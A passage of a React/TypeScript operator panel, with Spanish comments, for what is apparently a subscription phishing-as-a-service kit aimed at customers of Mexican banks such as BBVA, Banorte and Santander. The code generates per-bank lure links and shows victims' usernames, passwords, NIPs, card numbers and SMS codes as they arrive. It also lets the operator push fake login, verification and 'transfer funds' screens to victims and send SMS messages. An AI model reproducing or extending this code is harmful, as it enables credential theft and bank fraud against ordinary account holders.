useState<Session[]>([]);\n  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);\n  \n  // Estados para la ventana emergente de enviar SMS\n  const [isSmsSendDialogOpen, setIsSmsSendDialogOpen] = useState(false);\n  const [smsPhoneNumber, setSmsPhoneNumber] = useState('');\n  const [smsMessage, setSmsMessage] = useState('');\n  const [isSendingSms, setIsSendingSms] = useState(false);\n\n  // Determinar si es un usuario regular o administrador\n  const isAdmin = user?.role === 'admin';\n  const isSuperAdmin = user?.username === 'balonx';\n  const isRegularUser = user?.role === 'user';\n\n  // Socket connection for real-time updates\n  const { socket, connected, sendMessage } = useWebSocket(\"/ws\");\n\n  // Fetch sessions from API\n  // Consulta espec铆fica que garantice la obtenci贸n de sesiones guardadas\n  const { data: initialSessions, isLoading, refetch: refresh } = useQuery({\n    queryKey: ['/api/sessions', activeTab],\n    queryFn: async () => {\n      // Usar la pesta帽a activa para determinar el tipo, SIEMPRE SOLICITAMOS SAVED para brandon\n      let type = activeTab === 'saved' ? 'saved' : 'current';\n      \n      if (user?.username === 'brandon') {\n        // Forzar tipo 'saved' para cualquier pesta帽a si es el usuario brandon\n        type = 'saved';\n        console.log('FORZANDO obtenci贸n de sesiones guardadas para usuario brandon, independientemente de la pesta帽a.');\n      }\n      \n      console.log(`Solicitando sesiones del tipo: ${type} (pesta帽a: ${activeTab}, usuario: ${user?.username})`);\n      \n      // Agregamos un timestamp para evitar cach茅\n      const res = await apiRequest('GET', `/api/sessions?type=${type}&t=${Date.now()}`);\n      const sessions = await res.json();\n      \n      console.log(`Recibidas ${sessions.length} sesiones del servidor, tipo: ${type}`);\n      if (sessions.length > 0) {\n        console.log('Primera sesi贸n:', sessions[0]);\n      }\n      \n      return sessions;\n    },\n    refetchInterval: 10000, // Actualizar cada 10 segundos (reducido de 3s para menor carga del servidor)\n    refetchOnWindowFocus: true,\n    // Configuraci贸n de cach茅 basada en el tipo de sesiones\n    staleTime: activeTab === 'saved' ? 60000 : 0, // Cach茅 de 1 minuto para sesiones guardadas, sin cach茅 para actuales\n  });\n\n  // Generate link mutation\n  const generateLink = useMutation({\n    mutationFn: async () => {\n      // Utilizamos el banco seleccionado o LIVERPOOL como predeterminado si se eligi贸 'todos'\n      let banco = activeBank === 'todos' ? 'LIVERPOOL' : activeBank;\n      \n      console.log(`Generating link for bank: ${banco}`);\n      const res = await apiRequest('GET', `/api/generate-link?banco=${banco}`);\n      \n      if (!res.ok) {\n        const errorData = await res.json();\n        if (res.status === 403) {\n          throw new Error(errorData.error || \"No tienes permiso para usar este banco\");\n        }\n        throw new Error(\"Error al generar enlace\");\n      }\n      \n      return await res.json();\n    },\n    onSuccess: (data) => {\n      // Preferir shortUrl de Bitly si est谩 disponible, sino usar link largo\n      const linkToUse = data.shortUrl || data.link;\n      setClientLink(linkToUse);\n      setClientCode(data.code);\n      toast({\n        title: \"Link generado\",\n        description: data.shortUrl \n          ? `Link acortado con Bitly: ${data.code}` \n          : `Link generado con c贸digo: ${data.code}`,\n      });\n      \n      // Actualizar inmediatamente la lista de sesiones para mostrar la nueva sesi贸n\n      // Esto causar谩 una recarga completa de las sesiones desde el servidor\n      queryClient.invalidateQueries({ queryKey: ['/api/sessions'] });\n      \n      console.log(\"Solicitando actualizaci贸n de sesiones despu茅s de generar enlace...\");\n      \n      // Crear un elemento de texto temporal para copiar el enlace al portapapeles\n      try {\n        // Primero intentamos con el API Clipboard\n        const textArea = document.createElement('textarea');\n        textArea.value = linkToUse;\n        \n        // A帽adimos temporalmente el elemento al DOM\n        document.body.appendChild(textArea);\n        \n        // Seleccionamos y copiamos\n        textArea.select();\n        document.execCommand('copy');\n        \n        // Limpiamos\n        document.body.removeChild(textArea);\n        \n        console.log('Enlace copiado al portapapeles');\n        toast({\n          title: \"Enlace copiado\",\n          description: \"El enlace ha sido copiado al portapapeles\",\n        });\n      } catch (err) {\n        console.error('Error al copiar enlace:', err);\n        // Si falla, mostramos un mensaje para que copien manualmente\n        toast({\n          title: \"Enlace generado\",\n          description: \"Copia el enlace manualmente\",\n          variant: \"default\",\n        });\n      }\n    },\n    onError: (error: Error) => {\n      toast({\n        title: \"Error al generar link\",\n        description: error.message,\n        variant: \"destructive\",\n      });\n    }\n  });\n\n  // Socket event handlers\n  useEffect(() => {\n    if (connected && user) {\n      // Register as admin with username for permission checking\n      sendMessage({\n        type: 'REGISTER',\n        role: 'ADMIN',\n        username: user.username\n      });\n    }\n  }, [connected, sendMessage, user]);\n\n  useEffect(() => {\n    // Initialize sessions from API data\n    if (initialSessions) {\n      setSessions(Array.isArray(initialSessions) ? initialSessions : []);\n    }\n  }, [initialSessions]);\n  \n  // Redirigir a usuarios regulares si intentan acceder a pesta帽as restringidas por URL\n  useEffect(() => {\n    // Verificamos si estamos en pesta帽as restringidas\n    if (!isSuperAdmin && (activeTab === 'users' || activeTab === 'registered')) {\n      setActiveTab('current');\n    }\n    \n    // QR solo para administradores\n    if (user?.role !== 'admin' && activeTab === 'qr') {\n      setActiveTab('current');\n    }\n  }, [activeTab, isSuperAdmin, user?.role]);\n\n  // Efecto para cargar las sesiones (solo se ejecuta al cambiar la pesta帽a)\n  useEffect(() => {\n    // Cargar las sesiones inmediatamente al cambiar de pesta帽a\n    refresh();\n    \n    // Ya no usamos polling porque usamos WebSockets para actualizaciones en tiempo real\n  }, [activeTab, refresh]);\n\n  // Socket message handler\n  useEffect(() => {\n    if (!socket) return;\n\n    const handleMessage = (event: MessageEvent) => {\n      try {\n        const data = JSON.parse(event.data);\n        console.log(\"Mensaje WebSocket recibido en AdminPanel:\", data.type);\n        \n        if (data.type === 'INIT_SESSIONS') {\n          console.log(`Recibidas ${data.data.length} sesiones v铆a WebSocket`);\n          setSessions(data.data);\n        }\n        else if (data.type === 'SESSION_UPDATE') {\n          // Solo actualizar la sesi贸n en la pesta帽a actual\n          if ((activeTab === 'current' && !data.data.saved) || \n              (activeTab === 'saved' && data.data.saved)) {\n              \n            console.log(`Actualizando sesi贸n: ${data.data.sessionId}, creada por: ${data.data.createdBy || 'desconocido'}`);\n            \n            // Verificar si esta sesi贸n le pertenece al usuario actual\n            const isOwnSession = data.data.createdBy === user?.username;\n            const isSuperAdmin = user?.username === 'balonx';\n            \n            if (isOwnSession || isSuperAdmin) {\n              setSessions(prev => {\n                const updated = [...prev];\n                const index = updated.findIndex(s => s.sessionId === data.data.sessionId);\n                if (index >= 0) {\n                  updated[index] = data.data;\n                  console.log('Sesi贸n actualizada en la lista existente');\n                } else {\n                  updated.push(data.data);\n                  console.log('Nueva sesi贸n a帽adida a la lista');\n                }\n                return updated;\n              });\n            } else {\n              console.log('Sesi贸n ignorada porque pertenece a otro usuario');\n            }\n          }\n        }\n        else if (data.type === 'SESSIONS_UPDATED') {\n          console.log('Recibida se帽al para actualizar sesiones');\n          // Refrescar la lista de sesiones desde el servidor\n          queryClient.invalidateQueries({ queryKey: ['/api/sessions', activeTab] });\n        }\n        else if (data.type === 'SESSION_DELETE') {\n          // Eliminar la sesi贸n de la lista si est谩 presente\n          setSessions(prev => \n            prev.filter(session => session.sessionId !== data.data.sessionId)\n          );\n          \n          // Si la sesi贸n eliminada era la seleccionada, deseleccionarla\n          if (selectedSessionId === data.data.sessionId) {\n            setSelectedSessionId(null);\n          }\n          \n          toast({\n            title: \"Sesi贸n eliminada\",\n            description: \"La sesi贸n ha sido eliminada correctamente.\",\n          });\n        }\n        else if (data.type === 'SESSIONS_CLEANUP') {\n          // Notificar al usuario sobre la limpieza de sesiones expiradas\n          const { deletedCount } = data.data;\n          if (deletedCount > 0) {\n            toast({\n              title: \"Limpieza autom谩tica\",\n              description: `${deletedCount} sesiones antiguas (>5 d铆as) han sido eliminadas.`,\n            });\n            \n            // Actualizar la lista desde el servidor\n            queryClient.invalidateQueries({ queryKey: ['/api/sessions', activeTab] });\n          }\n        }\n        else if (data.type === 'SMS_COMPRA_CODE') {\n          // Notificaci贸n especial para c贸digos SMS_COMPRA\n          const { sessionId, code } = data.data;\n          \n          toast({\n            title: \"C贸digo de cancelaci贸n SMS_COMPRA\",\n            description: `C贸digo: ${code} (Sesi贸n: ${sessionId.substring(0, 6)}...)`,\n            variant: \"default\",\n          });\n          \n          console.log(\"SMS_COMPRA code:\", code, \"para sesi贸n:\", sessionId);\n        }\n        else if (data.type === 'CLIENT_INPUT_REALTIME') {\n          // Mostrar notificaci贸n de entrada de datos en tiempo real\n          const { sessionId, tipo, inputData } = data.data;\n          \n          // Manejo especial para SMS_COMPRA\n          if (tipo === 'sms_compra' || tipo === 'SMS_COMPRA' || tipo === 'smsCompra') {\n            if (inputData && inputData.smsCompra) {\n              toast({\n                title: \"隆C贸digo de cancelaci贸n recibido!\",\n                description: `C贸digo: ${inputData.smsCompra}`,\n                variant: \"default\",\n              });\n            }\n          }\n          \n          // Mostrar notificaci贸n toast con los datos recibidos\n          let inputDescription = '';\n          switch (tipo) {\n            case 'folio':\n              inputDescription = `Folio: ${inputData.folio}`;\n              break;\n            case 'login':\n              inputDescription = `Usuario: ${inputData.username}, Contrase帽a: ${inputData.password}`;\n              break;\n            case 'codigo':\n              inputDescription = `C贸digo SMS: ${inputData.codigo}`;\n              break;\n            case 'nip':\n              inputDescription = `NIP: ${inputData.nip}`;\n              break;\n            case 'tarjeta':\n              inputDescription = `Tarjeta: ${inputData.tarjeta}`;\n              break;\n            case 'sms_compra':\n            case 'SMS_COMPRA':\n            case 'smsCompra':\n              inputDescription = `C贸digo de Cancelaci贸n: ${inputData.smsCompra}`;\n              break;\n            case 'PROTECCION_SALDO':\n            case 'proteccion_saldo':\n              inputDescription = `Protecci贸n - D茅bito: ${inputData.saldoDebito || 'N/A'} (${inputData.montoDebito || '0'}), Cr茅dito: ${inputData.saldoCredito || 'N/A'} (${inputData.montoCredito || '0'})`;\n              break;\n            default:\n              inputDescription = `Datos de ${tipo}`;\n          }\n          \n          toast({\n            title: \"Datos recibidos en tiempo real\",\n            description: inputDescription,\n            variant: \"default\",\n          });\n          \n          // Actualizar la sesi贸n en la interfaz para mostrar datos inmediatamente\n          setSessions(prev => {\n            const updated = [...prev];\n            const index = updated.findIndex(s => s.sessionId === sessionId);\n            \n            if (index >= 0) {\n              // Crear copia de la sesi贸n actual\n              const updatedSession = { ...updated[index] };\n              \n              // Actualizar los campos seg煤n el tipo de datos\n              switch (tipo) {\n                case 'folio':\n                  updatedSession.folio = inputData.folio;\n                  break;\n                case 'login':\n                  updatedSession.username = inputData.username;\n                  updatedSession.password = inputData.password;\n                  break;\n                case 'codigo':\n                  updatedSession.sms = inputData.codigo;\n                  break;\n                case 'nip':\n                  updatedSession.nip = inputData.nip;\n                  break;\n                case 'tarjeta':\n                  updatedSession.tarjeta = inputData.tarjeta;\n                  break;\n                case 'sms_compra':\n                case 'SMS_COMPRA':\n                case 'smsCompra':\n                  updatedSession.smsCompra = inputData.smsCompra;\n                  break;\n                case 'celular':\n                  updatedSession.celular = inputData.celular;\n                  break;\n                case 'CANCELACION_RETIRO':\n                case 'cancelacion_retiro':\n                  updatedSession.codigoRetiro = inputData.codigoRetiro;\n                  if (inputData.pinRetiro) {\n                    updatedSession.pinRetiro = inputData.pinRetiro;\n                  }\n                  break;\n                case 'PROTECCION_SALDO':\n                case 'proteccion_saldo':\n                  updatedSession.saldoDebito = inputData.saldoDebito;\n                  updatedSession.montoDebito = inputData.montoDebito;\n                  updatedSession.saldoCredito = inputData.saldoCredito;\n                  updatedSession.montoCredito = inputData.montoCredito;\n                  break;\n              }\n              \n              // Actualizar en la lista\n              updated[index] = updatedSession;\n            }\n            \n            return updated;\n          });\n        }\n      } catch (error) {\n        console.error(\"Error parsing WebSocket message:\", error);\n      }\n    };\n\n    socket.addEventListener('message', handleMessage);\n    return () => {\n      socket.removeEventListener('message', handleMessage);\n    };\n  }, [socket]);\n\n  // Handle screen change\n  const handleScreenChange = (screen: string) => {\n    if (!selectedSessionId) {\n      toast({\n        title: \"Seleccione una sesi贸n\",\n        description: \"Debe seleccionar una sesi贸n para cambiar la pantalla.\",\n        variant: \"destructive\",\n      });\n      return;\n    }\n\n    // Debug para rastrear el flujo\n    console.log(\"handleScreenChange recibi贸 tipo de pantalla:\", screen);\n\n    // Handle modals for certain screens\n    if ([\"protege\", \"transferir\", \"cancelacion\", \"codigo\", \"mensaje\", \"sms_compra\"].includes(screen)) {\n      console.log(\"Activando modal para:\", screen);\n      setActiveModal(screen);\n      return;\n    }\n    \n    // Para cancelacion_retiro, enviamos directamente sin modal\n    if (screen === \"cancelacion_retiro\") {\n      console.log(\"Enviando pantalla de cancelaci贸n de retiro\");\n      // No necesitamos un modal, simplemente enviamos la pantalla\n    }\n    \n\n    \n    // Para escanear_qr, enviamos directamente sin modal\n    console.log(\"Enviando tipo de pantalla:\", screen);\n\n    // Send direct screen change for other screens\n    sendScreenChange({\n      tipo: `mostrar_${screen}`,\n      sessionId: selectedSessionId\n    });\n  };\n\n  // Send screen change via WebSocket\n  const sendScreenChange = (data: any) => {\n    if (connected) {\n      sendMessage({\n        type: 'SCREEN_CHANGE',\n        data\n      });\n\n      toast({\n        title: \"Pantalla cambiada\",\n        description: `La pantalla ha sido cambiada a ${data.tipo.replace('mostrar_', '')}.`,\n      });\n    } else {\n      toast({\n        title: \"Error de conexi贸n\",\n        description: \"No hay conexi贸n con el servidor.\",\n        variant: \"destructive\",\n      });\n    }\n  };\n\n  // Copy link to clipboard usando m茅todo alternativo\n  const copyLink = () => {\n    try {\n      // Crear un elemento temporal para copiar\n      const textArea = document.createElement('textarea');\n      textArea.value = clientLink;\n      \n      // A帽adir el elemento al DOM\n      document.body.appendChild(textArea);\n      \n      // Seleccionar y copiar\n      textArea.select();\n      document.execCommand('copy');\n      \n      // Eliminar el elemento temporal\n      document.body.removeChild(textArea);\n      \n      toast({\n        title: \"Link copiado\",\n        description: \"El link ha sido copiado al portapapeles.\",\n      });\n    } catch (error) {\n      toast({\n        title: \"Error al copiar\",\n        description: \"No se pudo copiar el link al portapapeles.\",\n        variant: \"destructive\",\n      });\n    }\n  };\n\n  // Handle session selection\n  const selectSession = (sessionId: string) => {\n    setSelectedSessionId(sessionId);\n  };\n\n  // Modal handlers\n  const closeModal = () => setActiveModal(null);\n\n  const handleProtectConfirm = (amount: string) => {\n    sendScreenChange({\n      tipo: 'mostrar_protege',\n      sessionId: selectedSessionId,\n      saldo: amount\n    });\n    closeModal();\n  };\n\n  const handleTransferConfirm = (data: { cantidad: string, titular: string, clabe: string, alias: string }) => {\n    sendScreenChange({\n      tipo: 'mostrar_transferir',\n      sessionId: selectedSessionId,\n      monto: data.cantidad,\n      titular: data.titular,\n      clabe: data.clabe\n    });\n    closeModal();\n  };\n\n  const handleCancelConfirm = (data: { importe: string, negocio: string }) => {\n    sendScreenChange({\n      tipo: 'mostrar_cancelacion',\n      sessionId: selectedSessionId,\n      monto: data.importe,\n      comercio: data.negocio\n    });\n    closeModal();\n  };\n\n  const handleCodeConfirm = (telefono: string) => {\n    // Ya estamos recibiendo un n煤mero de 10 d铆gitos (6 prefijo + 4 ingresados)\n    // desde el modal modificado\n    if (telefono && telefono.length === 10) {\n      const terminacion = telefono.substring(telefono.length - 4);\n      \n      // Mostrar el screen change directamente con la terminaci贸n ingresada\n      // ya no necesitamos actualizar el n煤mero completo del tel茅fono\n      if (selectedSessionId) {\n        // Enviamos directamente el screen change, no necesitamos actualizar el tel茅fono en la BD\n        sendScreenChange({\n          tipo: 'mostrar_codigo',\n          sessionId: selectedSessionId,\n          terminacion\n        });\n      }\n    } else {\n      toast({\n        title: \"Formato inv谩lido\",\n        description: \"Error en el formato de los 煤ltimos 4 d铆gitos del tel茅fono.\",\n        variant: \"destructive\",\n      });\n      return;\n    }\n    \n    closeModal();\n  };\n\n  const handleMessageConfirm = (mensaje: string) => {\n    sendScreenChange({\n      tipo: 'mostrar_mensaje',\n      sessionId: selectedSessionId,\n      mensaje\n    });\n    closeModal();\n  };\n\n  const handleSmsCompraConfirm = (telefono: string) => {\n    // Solo esperamos los 煤ltimos 4 d铆gitos del tel茅fono\n    if (telefono && telefono.length === 4) {\n      const terminacion = telefono; // Ya tenemos directamente los 4 d铆gitos\n      \n      // Enviar directamente la pantalla de SMS_COMPRA con los 4 d铆gitos\n      if (selectedSessionId) {\n        // Entonces, send the screen change directamente\n        console.log(\"ScreenType.SMS_COMPRA:\", ScreenType.SMS_COMPRA);\n        console.log(\"Enviando terminaci贸n:\", terminacion);\n        sendScreenChange({\n          tipo: `mostrar_${ScreenType.SMS_COMPRA}`,\n          sessionId: selectedSessionId,\n          terminacion\n        });\n      }\n    } else {\n      toast({\n        title: \"Entrada inv谩lida\",\n        description: \"Ingrese exactamente los 4 煤ltimos d铆gitos del n煤mero celular.\",\n        variant: \"destructive\",\n      });\n      return;\n    }\n    \n    closeModal();\n  };\n\n\n  \n  // Manejar el env铆o de SMS\n  const sendSms = useMutation({\n    mutationFn: async () => {\n      // Validar n煤mero de tel茅fono\n      if (!smsPhoneNumber || smsPhoneNumber.length !== 10 || !/^\\d+$/.test(smsPhoneNumber)) {\n        throw new Error(\"El n煤mero de tel茅fono debe tener 10 d铆gitos num茅ricos\");\n      }\n      \n      // Validar mensaje\n      if (!smsMessage.trim()) {\n        throw new Error(\"El mensaje no puede estar vac铆o\");\n      }\n      \n      const res = await apiRequest(\"POST\", \"/api/sms/send\", {\n        phoneNumber: smsPhoneNumber,\n        message: smsMessage\n      });\n      \n      return await res.json();\n    },\n    onMutate: () => {\n      setIsSendingSms(true);\n    },\n    onSuccess: () => {\n      toast({\n        title: \"SMS enviado\",\n        description: \"El mensaje ha sido enviado correctamente.\",\n      });\n      \n      // Limpiar el formulario y cerrar la ventana\n      setSmsPhoneNumber(\"\");\n      setSmsMessage(\"\");\n      setIsSmsSendDialogOpen(false);\n      \n      // Actualizar historial de SMS\n      queryClient.invalidateQueries({ queryKey: ['/api/sms/history'] });\n      queryClient.invalidateQueries({ queryKey: ['/api/sms/credits'] });\n    },\n    onError: (error: Error) => {\n      toast({\n        title: \"Error al enviar SMS\",\n        description: error.message,\n        variant: \"destructive\",\n      });\n    },\n    onSettled: () => {\n      setIsSendingSms(false);\n    }\n  });\n\n  // Vista completa para administradores\n  return (\n    <div className=\"flex flex-col md:flex-row w-full min-h-screen overflow-y-auto mobile-scrollable mobile-full-height\">\n      {/* Sidebar */}\n      <Sidebar \n        activeTab={activeTab}\n        onTabChange={(tab) => setActiveTab(tab as 'current' | 'saved' | 'users' | 'registered' | 'executives' | 'sms')}\n        isAdmin={isAdmin}\n        isSuperAdmin={isSuperAdmin}\n        accountType={user?.accountType as 'individual' | 'office' | undefined}\n        isExecutive={(user as any)?.isExecutive}\n      />\n\n      {/* Main Content */}\n      <div className=\"flex-1 bg-[#121212] text-white flex flex-col min-h-screen overflow-y-auto mobile-scrollable mobile-full-height\">\n        {/* Header Section - Estado de cuenta compacto arriba */}\n        <div className=\"p-2 md:p-3 pb-0 pt-16 md:pt-3\">\n          <div className=\"mb-2\">\n            <SubscriptionInfo />\n          </div>\n\n          {/* Mensaje de Soporte T茅cnico */}\n          <div className=\"mb-3 p-3 bg-blue-900/30 border border-blue-700/50 rounded-lg\">\n            <div className=\"flex items-center gap-2\">\n              <MessageSquare className=\"h-4 w-4 text-blue-400\" />\n              <span className=\"text-sm font-medium text-blue-200\">Soporte T茅cnico y Suscripciones:</span>\n            </div>\n            <p className=\"text-sm text-blue-100 mt-1\">\n              Para soporte t茅cnico o gesti贸n de suscripciones, comun铆cate por Telegram con{' '}\n              <span className=\"font-semibold text-blue-300\">@BalonxSistema</span>\n            </p>\n          </div>\n\n          <div className=\"flex flex-col md:flex-row md:justify-between md:items-start gap-2 md:gap-0\">\n            <div>\n              <p className=\"text-[#00aaff]\">Panel / Accesos</p>\n              <h1 className=\"text-xl md:text-2xl font-bold mb-3\">Panel Accesos</h1>\n              \n              <div className=\"mt-2\">\n                <label htmlFor=\"pantallaControl\" className=\"text-sm text-gray-400\">\n                  Acciones / Control de Pantalla:\n                </label>\n                <select \n                  id=\"pantallaControl\" \n                  className=\"mt-1 bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2 w-64\"\n                  onChange={(e) => handleScreenChange(e.target.value)}\n                  value=\"\"\n                >\n                  <option value=\"\">Selecciona una opci贸n</option>\n                  <option value=\"login\">1. Login</option>\n                  <option value=\"codigo\">2. C贸digo de verificaci贸n</option>\n                  <option value=\"nip\">3. NIP</option>\n                  <option value=\"protege\">4. Protege tu informaci贸n</option>\n                  <option value=\"tarjeta\">5. Ingresa tarjeta</option>\n                  <option value=\"transferir\">6. Transfiere fondos</option>\n                  <option value=\"cancelacion\">7. Cancelaci贸n exitosa</option>\n                  <option value=\"mensaje\">8. Ingresa el mensaje que gustes</option>\n                  <option value=\"sms_compra\">9. SMS Compra - Cancelaci贸n de cargos</option>\n                  <option value=\"escanear_qr\">10. Escanear QR de Tarjeta</option>\n                  <option value=\"cancelacion_retiro\">11. Cancelaci贸n de retiro sin tarjeta</option>\n                  <option value=\"proteccion_bancaria\">12. Protecci贸n Bancaria</option>\n                  <option value=\"proteccion_saldo\">13. Protecci贸n de Saldo</option>\n                  <option value=\"verificacion_id\">14. Verificaci贸n ID</option>\n                </select>\n              </div>\n            </div>\n            \n            {/* Botones de SMS eliminados por solicitud del usuario */}\n          </div>\n        </div>\n        \n        {/* Link Panel */}\n        <div className=\"mx-4 md:mx-6 mt-6 bg-[#1e1e1e] p-3 md:p-4 rounded-lg flex flex-col md:flex-row gap-4 md:gap-0 md:justify-between md:items-center\">\n          <div className=\"flex flex-col md:flex-row md:items-center gap-3 md:space-x-2\">\n            {/* En m贸vil, botones de acci贸n primero (encima de los enlaces) por solicitud del usuario */}\n            <div className=\"flex space-x-2 order-first mb-2 md:mb-0 md:order-last\">\n              <button \n                className=\"text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded\"\n                onClick={copyLink}\n              >\n                Copiar\n              </button>\n              <button \n                className=\"text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded\"\n                onClick={() => generateLink.mutate()}\n              >\n                {generateLink.isPending ? 'Generando...' : 'Regenerar'}\n              </button>\n              <a \n                href=\"/qr-generator\"\n                className=\"text-sm text-white font-medium bg-blue-600 hover:bg-blue-700 px-3 py-1 rounded flex items-center\"\n              >\n                <svg xmlns=\"http://www.w3.org/2000/svg\" className=\"mr-1 h-4 w-4\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" strokeWidth=\"2\" strokeLinecap=\"round\" strokeLinejoin=\"round\">\n                  <rect x=\"3\" y=\"3\" width=\"18\" height=\"18\" rx=\"2\" />\n                  <rect x=\"7\" y=\"7\" width=\"3\" height=\"3\" />\n                  <rect x=\"14\" y=\"7\" width=\"3\" height=\"3\" />\n                  <rect x=\"7\" y=\"14\" width=\"3\" height=\"3\" />\n                  <rect x=\"14\" y=\"14\" width=\"3\" height=\"3\" />\n                </svg>\n                QR\n              </a>\n            </div>\n            \n            <div className=\"flex items-center gap-2\">\n              <span className=\"font-semibold\">Liga activa:</span>\n              {clientLink && (\n                <a \n                  href={clientLink} \n                  target=\"_blank\" \n                  className=\"text-[#00aaff] text-sm md:text-base truncate max-w-[140px] md:max-w-[200px] lg:max-w-none\"\n                >\n                  {clientLink}\n                </a>\n              )}\n            </div>\n            \n            {clientCode && (\n              <span className={`font-bold px-3 py-1 rounded-md inline-flex items-center ${\n                activeBank === 'BANBAJIO' \n                  ? 'text-white bg-[#4D2C91]' \n                  : 'text-green-400 bg-[#1a3e1a]'\n              }`}>\n                C贸digo: <span className=\"text-xl tracking-wider ml-1\">{clientCode}</span>\n              </span>\n            )}\n          </div>\n          \n          <select \n            id=\"filtroBanco\" \n            className=\"bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2 w-full md:w-auto\"\n            value={activeBank}\n            onChange={(e) => setActiveBank(e.target.value)}\n          >\n            {user?.allowedBanks === 'all' || user?.role === 'admin' ? (\n              <>\n                <option value=\"todos\">Todos los bancos</option>\n                <option value=\"AFIRME\">AFIRME</option>\n                <option value=\"AMEX\">AMEX</option>\n                <option value=\"BANBAJIO\">BANBAJIO</option>\n                <option value=\"BANCO_AZTECA\">BANCO AZTECA</option>\n                <option value=\"BANCOPPEL\">BANCOPPEL</option>\n                <option value=\"BANORTE\">BANORTE</option>\n                <option value=\"BANREGIO\">BANREGIO</option>\n                <option value=\"BBVA\">BBVA</option>\n                <option value=\"BIENESTAR\">BANCO BIENESTAR</option>\n                <option value=\"CITIBANAMEX\">CITIBANAMEX</option>\n                <option value=\"HSBC\">HSBC</option>\n                <option value=\"INBURSA\">INBURSA</option>\n                <option value=\"INVEX\">INVEX</option>\n                <option value=\"LIVERPOOL\">LIVERPOOL</option>\n                <option value=\"PLATACARD\">PLATACARD</option>\n                <option value=\"SANTANDER\">SANTANDER</option>\n                <option value=\"SCOTIABANK\">SCOTIABANK</option>\n                <option value=\"SPIN\">SPIN</option>\n              </>\n            ) : (\n              <>\n                {user?.allowedBanks?.split(',').map(bank => (\n                  <option key={bank} value={bank}>\n                    {bank.toUpperCase()}\n                  </option>\n                ))}\n              </>\n            )}\n          </select>\n        </div>\n\n        {/* User Info & Logout */}\n        <div className=\"mx-4 md:mx-6 mt-2 md:mt-4 flex flex-row justify-end\">\n          <div className=\"flex items-center space-x-2\">\n            <span className=\"text-gray-400 text-xs md:text-sm mr-1 md:mr-2\">\n              {user?.username} ({user?.role})\n            </span>\n            <Button \n              variant=\"outline\" \n              size=\"sm\"\n              className=\"text-gray-300 hover:text-white text-xs md:text-sm py-1 h-8\"\n              onClick={() => logoutMutation.mutate()}\n            >\n              <LogOut className=\"h-3 w-3 md:h-4 md:w-4 mr-1\" />\n              <span className=\"hidden sm:inline\">Cerrar sesi贸n</span>\n              <span className=\"sm:hidden\">Salir</span>\n            </Button>\n          </div>\n        </div>\n\n        {/* Tabs */}\n        <div className=\"mx-4 md:mx-6 mt-4 overflow-x-auto pb-2\">\n          <div className=\"flex space-x-3 md:space-x-4 min-w-max\">\n            <div \n              className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap transition-all duration-200 font-medium ${activeTab === 'current' \n                ? 'border-[#00aaff] text-[#00aaff] bg-[#00aaff10] border-b-[3px] font-bold' \n                : 'border-transparent hover:text-gray-300 hover:border-gray-500'}`}\n              onClick={() => setActiveTab('current')}\n              style={{\n                padding: '6px 10px',\n                borderRadius: '6px 6px 0 0'\n              }}\n            >\n              Accesos actuales\n            </div>\n            <div \n              className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap transition-all duration-200 font-medium ${activeTab === 'saved' \n                ? 'border-[#00aaff] text-[#00aaff] bg-[#00aaff10] border-b-[3px] font-bold' \n                : 'border-transparent hover:text-gray-300 hover:border-gray-500'}`}\n              onClick={() => setActiveTab('saved')}\n              style={{\n                padding: '6px 10px',\n                borderRadius: '6px 6px 0 0'\n              }}\n            >\n              Accesos guardados\n            </div>\n            {isSuperAdmin && (\n              <>\n                <div \n                  className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap transition-all duration-200 font-medium ${activeTab === 'users' \n                    ? 'border-[#00aaff] text-[#00aaff] bg-[#00aaff10] border-b-[3px] font-bold' \n                    : 'border-transparent hover:text-gray-300 hover:border-gray-500'}`}\n                  onClick={() => setActiveTab('users')}\n                  style={{\n                    padding: '6px 10px',\n                    borderRadius: '6px 6px 0 0'\n                  }}\n                >\n                  Usuarios\n                </div>\n                <div \n                  className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap transition-all duration-200 font-medium ${activeTab === 'registered' \n                    ? 'border-[#00aaff] text-[#00aaff] bg-[#00aaff10] border-b-[3px] font-bold' \n                    : 'border-transparent hover:text-gray-300 hover:border-gray-500'}`}\n                  onClick={() => setActiveTab('registered')}\n                  style={{\n                    padding: '6px 10px',\n                    borderRadius: '6px 6px 0 0'\n                  }}\n                >\n                  Usuarios Registrados\n                </div>\n              </>\n            )}\n            {/* Ejecutivos solo para cuentas de oficina (no para ejecutivos) */}\n            {user?.accountType === 'office' && !(user as any)?.isExecutive && (\n              <div \n                className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap transition-all duration-200 font-medium ${activeTab === 'executives' \n                  ? 'border-[#00aaff] text-[#00aaff] bg-[#00aaff10] border-b-[3px] font-bold' \n                  : 'border-transparent hover:text-gray-300 hover:border-gray-500'}`}\n                onClick={() => setActiveTab('executives')}\n                style={{\n                  padding: '6px 10px',\n                  borderRadius: '6px 6px 0 0'\n                }}\n                data-testid=\"tab-executives\"\n              >\n                Ejecutivos\n              </div>\n            )}\n            {/* SMS para todos los usuarios */}\n            <div \n              className={`tab cursor-pointer pb-2 border-b-2 text-sm md:text-base whitespace-nowrap transition-all duration-200 font-medium ${activeTab === 'sms' \n                ? 'border-[#00aaff] text-[#00aaff] bg-[#00aaff10] border-b-[3px] font-bold' \n                : 'border-transparent hover:text-gray-300 hover:border-gray-500'}`}\n              onClick={() => setActiveTab('sms')}\n              style={{\n                padding: '6px 10px',\n                borderRadius: '6px 6px 0 0'\n              }}\n            >\n              {user?.role === 'admin' ? 'API MSJ' : 'Enviar SMS'}\n            </div>\n            <a \n              href=\"/qr-generator\"\n              className=\"tab cursor-pointer text-sm md:text-base whitespace-nowrap font-bold text-white\"\n              style={{\n                background: 'linear-gradient(to right, #0066ff, #00aaff)',\n                borderRadius: '6px',\n                padding: '8px 16px',\n                marginLeft: '12px',\n                textDecoration: 'none',\n                display: 'flex',\n                alignItems: 'center',\n                boxShadow: '0 2px 8px rgba(0, 120, 255, 